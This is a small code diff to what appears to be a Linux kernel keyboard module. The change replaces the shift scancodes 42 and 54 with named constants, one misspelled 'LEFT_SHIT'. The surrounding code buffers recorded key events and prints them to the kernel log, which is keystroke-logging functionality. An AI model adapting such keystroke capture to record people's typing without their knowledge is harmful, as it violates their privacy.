@@ -1,11 +1,15 @@
 #include "./keyboard.h"
 
+#define LEFT_SHIT	42
+#define RIGHT_SHIFT	54
+
 extern t_key	*first;
 
 static int	print_clear_buff(char buff[])
 {
 	pr_info("%s", buff);
 	memset(buff, 0, BUFF_SIZE);
+
 	return 0;
 }
 
@@ -20,7 +24,7 @@ void	print_log(void)
 
 	while (tmp != NULL) {
 		// check if shift is pressed
-		if (tmp->key == 42 || tmp->key == 54)
+		if (tmp->key == LEFT_SHIT || tmp->key == RIGHT_SHIFT)
 			shift = tmp->state;
 		// check if key is mapped, pressed and writable
 		if (keyboard_map[MIN][tmp->key] && tmp->state && tmp->key <= 57) {
